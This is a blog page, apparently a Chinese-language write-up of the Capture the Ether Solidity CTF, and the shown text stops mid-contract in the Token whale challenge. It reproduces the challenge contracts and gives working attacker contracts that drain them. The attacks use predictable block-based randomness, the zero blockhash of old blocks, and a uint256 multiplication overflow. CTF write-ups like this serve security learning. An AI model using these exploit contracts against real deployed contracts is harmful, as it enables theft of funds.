

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="John Doe">
  <meta name="keywords" content="">
  
    <meta name="description" content="靶场地址 WarmupDeploy a contract连接 MetaMask 即可 Call me要求调用callme函数 在remix的deploy处将我们挑战的页面里给出的合约地址填上，部署后调用即可  Choose a nickname设置自己的昵称 123456789101112131415161718192021222324252627pragma solidity ^0.4.21;&#x2F;">
<meta property="og:type" content="article">
<meta property="og:title" content="capture the ether wp">
<meta property="og:url" content="http://example.com/2022/04/02/capture%20the%20ether%20wp/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="靶场地址 WarmupDeploy a contract连接 MetaMask 即可 Call me要求调用callme函数 在remix的deploy处将我们挑战的页面里给出的合约地址填上，部署后调用即可  Choose a nickname设置自己的昵称 123456789101112131415161718192021222324252627pragma solidity ^0.4.21;&#x2F;">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/2022/04/02/capture%20the%20ether%20wp/image-20220321205348097.png">
<meta property="og:image" content="http://example.com/2022/04/02/capture%20the%20ether%20wp/image-20220322223448498.png">
<meta property="og:image" content="http://example.com/2022/04/02/capture%20the%20ether%20wp/Screenshot+2019-11-20+08.20.54.png">
<meta property="article:published_time" content="2022-04-02T14:54:37.000Z">
<meta property="article:modified_time" content="2022-08-15T13:32:22.749Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="靶场刷题">
<meta property="article:tag" content="Etherum">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://example.com/2022/04/02/capture%20the%20ether%20wp/image-20220321205348097.png">
  
  
  
  <title>capture the ether wp - Hexo</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 5.4.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Fluid</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                About
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="capture the ether wp"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2022-04-02 22:54" pubdate>
          April 2, 2022 pm
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          23k words
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          196 mins
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">capture the ether wp</h1>
            
            
              <div class="markdown-body">
                
                <p><a target="_blank" rel="noopener" href="https://capturetheether.com/">靶场地址</a></p>
<h2 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h2><h3 id="Deploy-a-contract"><a href="#Deploy-a-contract" class="headerlink" title="Deploy a contract"></a>Deploy a contract</h3><p>连接 MetaMask 即可</p>
<h3 id="Call-me"><a href="#Call-me" class="headerlink" title="Call me"></a>Call me</h3><p>要求调用callme函数</p>
<p>在remix的deploy处将我们挑战的页面里给出的合约地址填上，部署后调用即可</p>
<p><img src="/2022/04/02/capture%20the%20ether%20wp/image-20220321205348097.png" srcset="/img/loading.gif" lazyload alt="image-20220321205348097"></p>
<h3 id="Choose-a-nickname"><a href="#Choose-a-nickname" class="headerlink" title="Choose a nickname"></a>Choose a nickname</h3><p>设置自己的昵称</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>// Relevant part of the CaptureTheEther contract.<br>contract CaptureTheEther &#123;<br>    mapping (address =&gt; bytes32) public nicknameOf;<br><br>    function setNickname(bytes32 nickname) public &#123;<br>        nicknameOf[msg.sender] = nickname;<br>    &#125;<br>&#125;<br><br>// Challenge contract. You don&#x27;t need to do anything with this; it just verifies<br>// that you set a nickname for yourself.<br>contract NicknameChallenge &#123;<br>    CaptureTheEther cte = CaptureTheEther(msg.sender);<br>    address player;<br><br>    // Your address gets passed in as a constructor parameter.<br>    function NicknameChallenge(address _player) public &#123;<br>        player = _player;<br>    &#125;<br><br>    // Check that the first character is not null.<br>    function isComplete() public view returns (bool) &#123;<br>        return cte.nicknameOf(player)[0] != 0;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>同样的在remix里操作即可</p>
<p>注意要将昵称转化为十六进制，并且 <code>return cte.nicknameOf(player)[0] != 0;</code></p>
<h2 id="Lotteries"><a href="#Lotteries" class="headerlink" title="Lotteries"></a>Lotteries</h2><h3 id="Guess-the-number"><a href="#Guess-the-number" class="headerlink" title="Guess the number"></a>Guess the number</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract GuessTheNumberChallenge &#123;<br>    uint8 answer = 42;<br><br>    function GuessTheNumberChallenge() public payable &#123;<br>        require(msg.value == 1 ether);<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function guess(uint8 n) public payable &#123;<br>        require(msg.value == 1 ether);<br><br>        if (n == answer) &#123;<br>            msg.sender.transfer(2 ether);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>已知 <code>answer = 42</code></p>
<p>注意调用guess函数并传参42的同时发送1 ether</p>
<h3 id="Guess-the-secret-number"><a href="#Guess-the-secret-number" class="headerlink" title="Guess the secret number"></a>Guess the secret number</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract GuessTheSecretNumberChallenge &#123;<br>    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;<br><br>    function GuessTheSecretNumberChallenge() public payable &#123;<br>        require(msg.value == 1 ether);<br>    &#125;<br>    <br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function guess(uint8 n) public payable &#123;<br>        require(msg.value == 1 ether);<br><br>        if (keccak256(n) == answerHash) &#123;<br>            msg.sender.transfer(2 ether);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>可以计算答案</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.18;<br>contract guess &#123;<br>    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;<br>    uint8 public answer = 0;<br>    <br>    function guessanswer() returns (uint8) &#123;<br>        for(uint8 i = 0;i &lt;= 256;i ++)&#123;<br>            if(keccak256(i) == answerHash)&#123;<br>                answer = i;<br>                return answer;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="Guess-the-random-number"><a href="#Guess-the-random-number" class="headerlink" title="Guess the random number"></a>Guess the random number</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract GuessTheRandomNumberChallenge &#123;<br>    uint8 answer;<br><br>    function GuessTheRandomNumberChallenge() public payable &#123;<br>        require(msg.value == 1 ether);<br>        answer = uint8(keccak256(block.blockhash(block.number - 1), now));<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function guess(uint8 n) public payable &#123;<br>        require(msg.value == 1 ether);<br><br>        if (n == answer) &#123;<br>            msg.sender.transfer(2 ether);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>可以去<a target="_blank" rel="noopener" href="https://ropsten.etherscan.io/tx/0x156434f91ee12e3c759449de619ba2cb2b4f21f17f89e64eca87b181b8728e83#statechange">交易详情</a>查看</p>
<p><img src="/2022/04/02/capture%20the%20ether%20wp/image-20220322223448498.png" srcset="/img/loading.gif" lazyload alt="image-20220322223448498"></p>
<p>即77</p>
<h3 id="Guess-the-new-number"><a href="#Guess-the-new-number" class="headerlink" title="Guess the new number"></a>Guess the new number</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract GuessTheNewNumberChallenge &#123;<br>    function GuessTheNewNumberChallenge() public payable &#123;<br>        require(msg.value == 1 ether);<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function guess(uint8 n) public payable &#123;<br>        require(msg.value == 1 ether);<br>        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));<br><br>        if (n == answer) &#123;<br>            msg.sender.transfer(2 ether);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>写一个 <code>constructor()</code> ，部署时打入1ETH</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract attacker &#123;<br>    constructor() public payable &#123;<br>        <br>    &#125; <br>    function attack() public payable &#123;<br>        uint8 result = uint8(keccak256(block.blockhash(block.number - 1), now));<br>        GuessTheNewNumberChallenge target = GuessTheNewNumberChallenge(0x311e6C0Ae5476ad374c0e7A9B4582ac1eB42b213);<br>        target.guess.value(1 ether)(result);<br>    &#125;<br><br>    function() public payable &#123;<br><br>    &#125;<br><br>    function destroy() public payable &#123;<br>        selfdestruct(msg.sender);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="Predict-the-future"><a href="#Predict-the-future" class="headerlink" title="Predict the future"></a>Predict the future</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract PredictTheFutureChallenge &#123;<br>    address guesser;<br>    uint8 guess;<br>    uint256 settlementBlockNumber;<br><br>    function PredictTheFutureChallenge() public payable &#123;<br>        require(msg.value == 1 ether);<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function lockInGuess(uint8 n) public payable &#123;<br>        require(guesser == 0);<br>        require(msg.value == 1 ether);<br><br>        guesser = msg.sender;<br>        guess = n;<br>        settlementBlockNumber = block.number + 1;<br>    &#125;<br><br>    function settle() public &#123;<br>        require(msg.sender == guesser);<br>        require(block.number &gt; settlementBlockNumber);<br><br>        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;<br><br>        guesser = 0;<br>        if (guess == answer) &#123;<br>            msg.sender.transfer(2 ether);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>让answer来就我们，按照规则一次一次地尝试生成answer，当此块的信息得到的answer与我们猜的guess相同时我们再调用settle函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract attacker &#123;<br>    PredictTheFutureChallenge target;<br>    uint8 result;<br>    constructor() public payable &#123;<br>        target = PredictTheFutureChallenge(0xf6C4f214fDF6B367255281c0cF65653B0820F1F9);<br>    &#125;<br><br>    function attack() payable&#123;<br>        target.lockInGuess.value(1 ether)(3);<br>    &#125;<br><br>    function exploit() &#123;<br>        result = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;<br>        if(result == 3)&#123;<br>            target.settle();<br>        &#125;<br>    &#125;<br><br>    function see() view returns (uint8) &#123;<br>        return result;<br>    &#125;<br><br>    function destroy() payable &#123;<br>        selfdestruct(msg.sender);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<h3 id="Predict-the-block-hash"><a href="#Predict-the-block-hash" class="headerlink" title="Predict the block hash"></a>Predict the block hash</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract PredictTheBlockHashChallenge &#123;<br>    address guesser;<br>    bytes32 guess;<br>    uint256 settlementBlockNumber;<br><br>    function PredictTheBlockHashChallenge() public payable &#123;<br>        require(msg.value == 1 ether);<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function lockInGuess(bytes32 hash) public payable &#123;<br>        require(guesser == 0);<br>        require(msg.value == 1 ether);<br><br>        guesser = msg.sender;<br>        guess = hash;<br>        settlementBlockNumber = block.number + 1;<br>    &#125;<br><br>    function settle() public &#123;<br>        require(msg.sender == guesser);<br>        require(block.number &gt; settlementBlockNumber);<br><br>        bytes32 answer = block.blockhash(settlementBlockNumber);<br><br>        guesser = 0;<br>        if (guess == answer) &#123;<br>            msg.sender.transfer(2 ether);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/2022/04/02/capture%20the%20ether%20wp/Screenshot+2019-11-20+08.20.54.png" srcset="/img/loading.gif" lazyload alt="Screenshot 2019-11-20 08.20.54.png"></p>
<p>我们看到该函数仅适用于最近的 256 个块。如果您尝试调用发生在 300 块前的函数，它会返回零。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract attacker &#123;<br>    PredictTheBlockHashChallenge target = PredictTheBlockHashChallenge(0xB562947997118272df148A0c5d8Ca1d6aEb4948F);<br>    uint256 settlementBlockNumber;<br><br>    constructor() payable &#123;<br><br>    &#125;<br><br>    function attack() payable &#123;<br>        settlementBlockNumber = block.number + 1;<br>        target.lockInGuess.value(1 ether)(0x0000000000000000000000000000000000000000000000000000000000000000);<br>    &#125;<br><br>    function exploit() &#123;<br>        require(block.number-settlementBlockNumber&gt;=256);<br>        target.settle();<br>    &#125;<br><br>    function destroy() payable &#123;<br>        selfdestruct(msg.sender);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h2><h3 id="Token-sale"><a href="#Token-sale" class="headerlink" title="Token sale"></a>Token sale</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract TokenSaleChallenge &#123;<br>    mapping(address =&gt; uint256) public balanceOf;<br>    uint256 constant PRICE_PER_TOKEN = 1 ether;<br><br>    function TokenSaleChallenge(address _player) public payable &#123;<br>        require(msg.value == 1 ether);<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance &lt; 1 ether;<br>    &#125;<br><br>    function buy(uint256 numTokens) public payable &#123;<br>        require(msg.value == numTokens * PRICE_PER_TOKEN);<br><br>        balanceOf[msg.sender] += numTokens;<br>    &#125;<br><br>    function sell(uint256 numTokens) public &#123;<br>        require(balanceOf[msg.sender] &gt;= numTokens);<br><br>        balanceOf[msg.sender] -= numTokens;<br>        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><code>require(msg.value == numTokens * PRICE_PER_TOKEN);</code> 存在整数乘法上溢</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span> ether = <span class="hljs-number">10</span>^<span class="hljs-number">18</span> wei<br><span class="hljs-regexp">//</span>最大的uint256 = = <span class="hljs-number">115792089237316195423570985008687907853269984665640564039457584007913129639936</span><br>numTokens = <span class="hljs-number">2</span>**<span class="hljs-number">256</span> / <span class="hljs-number">10</span>**<span class="hljs-number">18</span> + <span class="hljs-number">1</span> = <span class="hljs-number">115792089237316195423570985008687907853269984665640564039458</span><br><span class="hljs-regexp">//</span><br>value = numTokens*<span class="hljs-number">10</span>**<span class="hljs-number">18</span>-<span class="hljs-number">2</span>**<span class="hljs-number">256</span> = <span class="hljs-number">415992086870360064</span><br></code></pre></td></tr></table></figure>

<p>value为 0.415992086870360064 ether，要求 msg.value == numTokens * PRICE_PER_TOKEN 可以被满足。</p>
<p>然后我们可以 <code>sell()</code> 1 ether，合约余额现在为 0.41ether</p>
<h3 id="Token-whale"><a href="#Token-whale" class="headerlink" title="Token whale"></a>Token whale</h3><p>Find a way to accumulate at least 1,000,000 tokens to solve this challenge.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract TokenWhaleChallenge &#123;<br>    address player;<br><br>    uint256 public totalSupply;<br>    mapping(address =&gt; uint256) public balanceOf;<br>    mapping(address =&gt; mapping(address =&gt; uint256)) public allowance;<br><br>    string public name = &quot;Simple ERC20 Token&quot;;<br>    string public symbol = &quot;SET&quot;;<br>    uint8 public decimals = 18;<br><br>    function TokenWhaleChallenge(address _player) public &#123;<br>        player = _player;<br>        totalSupply = 1000;<br>        balanceOf[player] = 1000;<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return balanceOf[player] &gt;= 1000000;<br>    &#125;<br><br>    event Transfer(address indexed from, address indexed to, uint256 value);<br><br>    function _transfer(address to, uint256 value) internal &#123;<br>        